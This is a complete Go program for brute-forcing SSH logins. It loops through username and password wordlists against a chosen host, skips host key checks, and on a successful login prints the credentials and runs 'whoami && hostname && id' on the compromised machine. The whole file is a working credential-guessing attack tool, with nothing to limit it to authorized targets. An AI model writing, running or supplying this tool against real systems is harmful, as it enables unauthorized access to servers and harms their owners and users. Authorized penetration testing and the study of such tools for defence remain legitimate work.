package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	host := flag.String("host", "", "Target SSH host/IP (required)")
	port := flag.Int("port", 22, "SSH port")
	delay := flag.Duration("delay", 1*time.Second, "Delay between attempts")
	usernamesFile := flag.String("users", "usernames.txt", "Usernames wordlist")
	passwordsFile := flag.String("pass", "passwords.txt", "Passwords wordlist")

	flag.Parse()

	if *host == "" {
		fmt.Println("Usage: ./ssh-brute -host <target> [options]")
		fmt.Println("Example: ./ssh-brute -host 192.168.1.100 -port 22 -delay 500ms")
		flag.Usage()
		os.Exit(1)
	}

	usernames, err := readLines(*usernamesFile)
	if err != nil {
		fmt.Printf("Error reading %s: %v\n", *usernamesFile, err)
		os.Exit(1)
	}

	passwords, err := readLines(*passwordsFile)
	if err != nil {
		fmt.Printf("Error reading %s: %v\n", *passwordsFile, err)
		os.Exit(1)
	}

	fmt.Printf("?? Starting SSH brute force on %s:%d\n", *host, *port)
	fmt.Printf("?? Loaded %d usernames and %d passwords\n", len(usernames), len(passwords))
	fmt.Println(strings.Repeat("-", 70))

	found := false

	for _, user := range usernames {
		for _, pass := range passwords {
			if found {
				return
			}

			fmt.Printf("[%s] Trying ? %s:%s\n", time.Now().Format("15:04:05"), user, pass)

			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(pass),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Warning: Not for production
				Timeout:         8 * time.Second,
			}

			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", *host, *port), config)
			if err == nil {
				fmt.Printf("\n? SUCCESS! Username: %s | Password: %s\n", user, pass)

				// Optional: Run a command to verify
				session, err := client.NewSession()
				if err == nil {
					out, _ := session.CombinedOutput("whoami && hostname && id")
					fmt.Printf("   System: %s\n", strings.TrimSpace(string(out)))
					session.Close()
				}

				client.Close()
				found = true
				break
			}

			// Authentication failed or connection error
			time.Sleep(*delay)
		}
	}

	if !found {
		fmt.Println("\n? No valid credentials found.")
	}
}

func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}